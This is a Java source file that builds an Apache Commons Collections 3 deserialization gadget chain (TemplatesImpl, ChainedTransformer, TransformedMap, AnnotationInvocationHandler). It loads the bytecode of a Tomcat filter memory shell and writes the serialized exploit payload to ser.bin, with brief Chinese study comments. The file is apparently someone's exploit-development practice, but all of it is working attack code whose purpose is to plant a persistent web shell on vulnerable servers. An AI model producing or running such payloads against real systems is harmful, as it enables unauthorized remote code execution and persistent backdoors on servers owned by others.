package Gadget;

import com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl;
import com.sun.org.apache.xalan.internal.xsltc.trax.TrAXFilter;
import com.sun.org.apache.xalan.internal.xsltc.trax.TransformerFactoryImpl;
import org.apache.commons.collections.Transformer;
import org.apache.commons.collections.functors.ChainedTransformer;
import org.apache.commons.collections.functors.ConstantTransformer;
import org.apache.commons.collections.functors.InstantiateTransformer;
import org.apache.commons.collections.map.TransformedMap;

import javax.xml.transform.Templates;
import javax.xml.transform.TransformerConfigurationException;
import java.io.*;
import java.lang.annotation.Target;
import java.lang.reflect.Constructor;
import java.lang.reflect.Field;
import java.lang.reflect.InvocationTargetException;
import java.nio.file.Files;
import java.nio.file.Paths;
import java.util.HashMap;
import java.util.Map;

public class CC3_2 {
    public static void main(String[] args) throws NoSuchFieldException, IllegalAccessException, IOException, TransformerConfigurationException, ClassNotFoundException, NoSuchMethodException, InvocationTargetException, InstantiationException {

        TemplatesImpl templatesimpl=new TemplatesImpl();

        //getTransletInstance()第一个判断
        Class c=templatesimpl.getClass();
        Field _nameField=c.getDeclaredField("_name");
        _nameField.setAccessible(true);
        _nameField.set(templatesimpl,"aaa");

        //要加载类的字节码
        Field _byteCodesField=c.getDeclaredField("_bytecodes");
        _byteCodesField.setAccessible(true);

//        byte[] code= Files.readAllBytes(Paths.get("C:\\Users\\34946\\Desktop\\Java_memShell\\Tomcat_Serialize\\target\\classes\\Tomcat_Echo_memShell\\Tomcat_Echo_inject_ThreadLocal.class"));
        byte[] code= Files.readAllBytes(Paths.get("C:\\Users\\34946\\Desktop\\Java_memShell\\Tomcat_Serialize\\target\\classes\\Tomcat_Echo_memShell\\Tomcat_Echo_inject_Filter.class"));

        byte[][] codes= {code};
        _byteCodesField.set(templatesimpl,codes);

//防止报错
        Field tfactory = c.getDeclaredField("_tfactory");
        tfactory.setAccessible(true);
        tfactory.set(templatesimpl,new TransformerFactoryImpl());

//        templatesimpl.newTransformer();
        //用来初始化TemplatesImpl类
        InstantiateTransformer instantiateTransformer = new InstantiateTransformer(new Class[]{Templates.class}, new Object[]{templatesimpl});

        Transformer[] transformers=new Transformer[]{
                new ConstantTransformer(TrAXFilter.class),
                instantiateTransformer
        };

        ChainedTransformer chainedTransformer=new ChainedTransformer(transformers);

//        chainedTransformer.transform(1);

//        instantiateTransformer.transform(TrAXFilter.class);

        HashMap<Object,Object> map=new HashMap<>();
        map.put("value","value");
        Map<Object,Object> transformedMap= TransformedMap.decorate(map,null,chainedTransformer);
//        for (Map.Entry entry: transformedMap.entrySet()){
//            entry.setValue(Runtime.getRuntime());
//        }


        Class c2=Class.forName("sun.reflect.annotation.AnnotationInvocationHandler");
        Constructor AnnotationInvocationHandlerConstructor=c2.getDeclaredConstructor(Class.class,Map.class);
        AnnotationInvocationHandlerConstructor.setAccessible(true);
        Object o=AnnotationInvocationHandlerConstructor.newInstance(Target.class,transformedMap);
        serialize(o);
//        unserialize("ser.bin");
    }
    //序列化
    public static void serialize(Object obj) throws IOException {
        ObjectOutputStream oos=new ObjectOutputStream(new FileOutputStream("ser.bin"));
        oos.writeObject(obj);
    }

    //反序列化
    public static Object unserialize(String Filename) throws IOException,ClassNotFoundException{
        ObjectInputStream ois=new ObjectInputStream(new FileInputStream(Filename));
        Object object=ois.readObject();
        return object;
    }
}
